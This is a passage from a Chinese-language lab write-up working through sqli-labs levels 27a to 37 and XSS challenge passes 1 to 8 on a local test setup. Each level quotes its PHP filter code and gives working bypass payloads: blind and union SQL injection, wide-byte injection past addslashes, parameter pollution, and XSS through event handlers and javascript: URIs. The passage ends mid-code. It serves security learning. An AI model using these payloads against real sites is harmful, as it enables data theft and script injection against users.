//Strip out spaces.</span><br><span class="line">$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);        //Strip out spaces.</span><br><span class="line">$id= preg_replace(&#x27;/union/s&#x27;,&quot;&quot;, $id);        //Strip out union</span><br><span class="line">$id= preg_replace(&#x27;/select/s&#x27;,&quot;&quot;, $id);        //Strip out select</span><br><span class="line">$id= preg_replace(&#x27;/UNION/s&#x27;,&quot;&quot;, $id);        //Strip out UNION</span><br><span class="line">$id= preg_replace(&#x27;/SELECT/s&#x27;,&quot;&quot;, $id);        //Strip out SELECT</span><br><span class="line">$id= preg_replace(&#x27;/Union/s&#x27;,&quot;&quot;, $id);        //Strip out Union</span><br><span class="line">$id= preg_replace(&#x27;/Select/s&#x27;,&quot;&quot;, $id);        //Strip out select</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="No-27a"><a href="#No-27a" class="headerlink" title="No.27a"></a>No.27a</h2><p>和上一关差不多，就是换成了双引号。</p>
<blockquote>
<p>但看大佬们的答案时，这里有个神奇的payload，我好好研究下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;and(if(ascii(substr((SeLect(table_name)from(SeLect(table_name),(table_rows)from(information_schema.tables)where(table_schema=database())and(table_rows=14))a),1,1))&gt;137,0,sleep(5)))and&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure>

<p>这个payload的核心是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SeLect(table_name)from(SeLect(table_name),(table_rows)from(information_schema.tables)where(table_schema=database())and(table_rows=8))a</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/27_2.png" alt="27_2"></p>
<p>因为substr只能处理一个字段，所以将需要请求的两个字段放在from里，并起别名a，这个在No.5floor报错注入里提到过。</p>
<p>但随后发现，不用from也是可以的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;and(if(ascii(substr((SeLect(table_name)from(information_schema.tables)where(table_schema=database())and(table_rows=14)),1,1))&gt;137,0,sleep(5)))and&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure>

<p>但可能以后用得到，所以就把过程都记录下来了。</p>
</blockquote>
<p>从这个payload里学到了，对于<code>limit 0,1</code>空格不能使用时，我们可以使用<strong>其他字段</strong>来增加限制条件。</p>
<h2 id="No-28"><a href="#No-28" class="headerlink" title="No.28"></a>No.28</h2><p>先测试注入点，发现是单引号加小括号注入。</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/28_1.png" alt="28_1"></p>
<p>发现这里的select和union被过滤，于是想到可不可以双写注入：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/28_2.png" alt="28_2"></p>
<p>这里双写的select和union又出现了，很迷，看一下源码“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id= preg_replace(&#x27;/union\s+select/i&#x27;,&quot;&quot;, $id);</span><br></pre></td></tr></table></figure>

<p>\s是空格的意思，+是匹配随便多少个空格，意思是去掉<code>union+空格类似符+select</code>。</p>
<p>于是这样构造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;)%0aunion%0aunion%0aselect%0aselect%0a1,2,3%0aand &#x27;1&#x27;=(&#x27;1</span><br></pre></td></tr></table></figure>

<p>这关不回显错误，所以不能用布尔注入。</p>
<h2 id="No-28a"><a href="#No-28a" class="headerlink" title="No.28a"></a>No.28a</h2><p>和上一关一样，也可以用布尔注入和时间注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Sql-labs/Less-28/?id=1&#x27;)and &#x27;1&#x27;=(&#x27;2            //不返回</span><br><span class="line">http://localhost/Sql-labs/Less-28/?id=1&#x27;)and &#x27;1&#x27;=(&#x27;1            //返回</span><br></pre></td></tr></table></figure>

<p>payload类似于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) %0a and %0a if((ascii(substring((select %0a table_name %0a from %0a information_schema.tables %0a where %0a table_schema=&#x27;security&#x27; %0a limit %0a 0,1),1,1))&gt;200),1,sleep(2))%0a and &#x27;1&#x27;=(&#x27;1</span><br><span class="line"></span><br><span class="line">%00截断似乎也可以：</span><br><span class="line">?id=1&#x27;) %0a and %0a if((ascii(substring((select %0a table_name %0a from %0a information_schema.tables %0a where %0a table_schema=&#x27;security&#x27; %0a limit %0a 0,1),1,1))&gt;200),1,sleep(2))%0a;%00</span><br></pre></td></tr></table></figure>

<h2 id="No-29-No-31"><a href="#No-29-No-31" class="headerlink" title="No.29-No.31"></a>No.29-No.31</h2><p>这三关都讲了一件事：<a target="_blank" rel="noopener" href="http://www.mamicode.com/info-detail-2909452.html">看这</a>和<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/p/5762961.html">这里</a></p>
<p>讲的是服务器的两层架构，总的来说可以利用<strong>参数污染</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Sql-labs/Less-29/login.php?id=1&amp;id=2            </span><br><span class="line">//这样显示的是id=2的搜索内容，直接在id=2后面进行注入点测试即可</span><br></pre></td></tr></table></figure>

<h2 id="No-32【宽字节注入】【绕过引号】"><a href="#No-32【宽字节注入】【绕过引号】" class="headerlink" title="No.32【宽字节注入】【绕过引号】"></a>No.32【宽字节注入】【绕过引号】</h2><p>这一关过滤了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          //escape any backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                               //escape single quote with a backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&quot;/&#x27;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/32_1.png" alt="32_1"></p>
<p>正常注入’会被转义，这里我没想到可以用宽字节注入，因为汉字是两个字节，我们可以在,即转义符号之前加上另一个十六进制把它构成一个汉字：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%dd&#x27;</span><br></pre></td></tr></table></figure>

<p>这里%dd变成十六进制（0xdd）和后面的\（0x5c）在一起构成了0xdd0x5c是一个汉字，后面的单引号就被释放了。</p>
<blockquote>
<p>宽字节注入：本人理解的是，由于英文编码每个字母占一个字节，而汉语编码每个汉字占用两个字节，而注入的时候会自动在单引号和双引号前面加上反斜杠（\’)进行转义造成注入失败，所以前面再加上一个汉语编码，如%df（其他编码也可以，不过要ASCII值大于128服务器才会认为是汉字（GBK）编码），由于服务器认为编码是两个字节所以会将后面的反斜杠编码（\）即%5c也看作是汉语编码，从而造成%df%5c被认为是一个汉字，后面的单引号逃逸了出来构成注入。</p>
</blockquote>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/32_2.png" alt="32_2"></p>
<p>这样就成功报错，接下来正常注入就行了</p>
<p>还有一个小问题，就是我们遇到如下语句时也是会接触双引号的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>

<p>这里有两种方法绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">方法一：直接用database()代替&#x27;security&#x27;</span><br><span class="line">?id=-1%dd%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">方法二：可以使用十六进制绕过</span><br><span class="line">?id=-1%dd%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479--+</span><br><span class="line">//首先，这里的十六进制之前要加0x；</span><br><span class="line">//其次，这里十六进制encoding的只是security而不是&#x27;security&#x27;</span><br></pre></td></tr></table></figure>

<p>爆列类似：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%dd%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=(select table_name from information_schema.tables where table_schema=database() limit 3,1)--+</span><br></pre></td></tr></table></figure>

<h2 id="No-33【addslashes-】"><a href="#No-33【addslashes-】" class="headerlink" title="No.33【addslashes()】"></a>No.33【addslashes()】</h2><p>这一关用的addslashes()函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string= addslashes($string);    </span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但总的注入方法还是一样的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%dd&#x27;  union select 1,database(),3--+</span><br></pre></td></tr></table></figure>

<h2 id="No-34【POST绕过引号】"><a href="#No-34【POST绕过引号】" class="headerlink" title="No.34【POST绕过引号】"></a>No.34【POST绕过引号】</h2><p>这一关也是过滤引号，只不过数据是要用POST传递，既然是POST传递，那么结果就会被url编码，比如%dd会变成%25dd。既然这样我们就只能取原字符，类似于：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/34_1.png" alt="34_1"></p>
<p>也可以bp直接跑，还是填%dd，不会二次编码。</p>
<h2 id="No-35"><a href="#No-35" class="headerlink" title="No.35"></a>No.35</h2><p>都一样，就是成了数字型注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479--+</span><br></pre></td></tr></table></figure>

<h2 id="No-36-No-37【mysql-real-escape-string-】"><a href="#No-36-No-37【mysql-real-escape-string-】" class="headerlink" title="No.36-No.37【mysql_real_escape_string()】"></a>No.36-No.37【mysql_real_escape_string()】</h2><blockquote>
<p><code>mysql_real_escape_string()</code>函数转义 SQL 语句中使用的字符串中的特殊字符：</p>
<ul>
<li><code>\x00</code></li>
<li><code>\n</code></li>
<li><code>\r</code></li>
<li><code>\</code></li>
<li><code>&#39;</code></li>
<li><code>&quot;</code></li>
<li><code>\x1a</code></li>
</ul>
</blockquote>
<p>而对于sql注入来说这个函数和之前的addslashes()函数差距应该不是太大，所以注入方式就见前两关，不再赘述。</p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="Pass1【无过滤】"><a href="#Pass1【无过滤】" class="headerlink" title="Pass1【无过滤】"></a>Pass1【无过滤】</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">?name=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>字母要有&#x2F;&#x2F;或者单双引号，数字可以省略</p>
<h2 id="Pass2【-gt-闭合】"><a href="#Pass2【-gt-闭合】" class="headerlink" title="Pass2【&gt;闭合】"></a>Pass2【&gt;闭合】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里echo处用了<code>htmlspecialchars()</code></p>
<blockquote>
<h2 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h2><p><code>htmlspecialchars()</code> 函数把预定义的字符转换为 HTML 实体。</p>
<p>预定义的字符是：</p>
<ul>
<li>&amp; （和号）成为 &amp;</li>
<li>“ （双引号）成为 “</li>
<li>‘ （单引号）成为 ‘</li>
<li>&lt; （小于）成为 &lt;</li>
<li>&gt; （大于）成为 &gt;</li>
</ul>
<p>实体的意思是仅作显示之用，没有特殊含义</p>
<p>但是这个函数存在第二参数：</p>
<p>可用的引号类型：</p>
<ul>
<li>ENT_COMPAT - 默认。仅编码双引号。</li>
<li>ENT_QUOTES - 编码双引号和单引号。</li>
<li>ENT_NOQUOTES - 不编码任何引号。</li>
</ul>
<p>也就是不设置第二参数的话，仅会过滤双引号，却放行了单引号</p>
</blockquote>
<p>所以只能在input处构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=ag&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;//</span><br></pre></td></tr></table></figure>

<p>变成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;ag&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>





<h2 id="Pass3【单引号闭合触发事件】"><a href="#Pass3【单引号闭合触发事件】" class="headerlink" title="Pass3【单引号闭合触发事件】"></a>Pass3【单引号闭合触发事件】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现两边都htmlspecialchars()了，但是没有设置第二参数，且value是单引号包裹，所以可以单引号闭合。</p>
<p>可以构造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&#x27; onmouseover=&#x27;alert(/xss/)</span><br></pre></td></tr></table></figure>

<p>最后变成了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&#x27;ag&#x27; onmouseover=&#x27;alert(/xss/)&#x27;&gt;</span><br></pre></td></tr></table></figure>







<h2 id="Pass4【双引号闭合触发事件】"><a href="#Pass4【双引号闭合触发事件】" class="headerlink" title="Pass4【双引号闭合触发事件】"></a>Pass4【双引号闭合触发事件】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里过滤了尖括号，且value用双引号包裹，所以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&quot; onmouseover=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<p>最后变成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;ag&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure>







<h2 id="Pass5【javascript伪协议】"><a href="#Pass5【javascript伪协议】" class="headerlink" title="Pass5【javascript伪协议】"></a>Pass5【javascript伪协议】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>过滤了script标签和触发事件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;click&lt;/a&gt;//</span><br></pre></td></tr></table></figure>

<p>最终变成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;ag&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>







<h2 id="Pass6【大小写绕过】"><a href="#Pass6【大小写绕过】" class="headerlink" title="Pass6【大小写绕过】"></a>Pass6【大小写绕过】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>这关没有将keyword转小写，就有了漏洞，将上一关href变成大写即可绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&quot;&gt;&lt;a HREF=&quot;javascript:alert(/xss/)&quot;&gt;click&lt;/a&gt;//</span><br></pre></td></tr></table></figure>







<h2 id="Pass7【双写绕过】"><a href="#Pass7【双写绕过】" class="headerlink" title="Pass7【双写绕过】"></a>Pass7【双写绕过】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> =<span class="title function_ invoke__">strtolower</span>( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>还是利用Pass5的payload，双写一下即可【javascript里的script也要双写】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&quot;&gt;&lt;a hrhrefef=&quot;javascrscriptipt:alert(/xss/)&quot;&gt;click&lt;/a&gt;//</span><br></pre></td></tr></table></figure>









<h2 id="Pass8【HTML字符实体绕过】"><a href="#Pass8【HTML字符实体绕过】" class="headerlink" title="Pass8【HTML字符实体绕过】"></a>Pass8【HTML字符实体绕过】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str7</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span 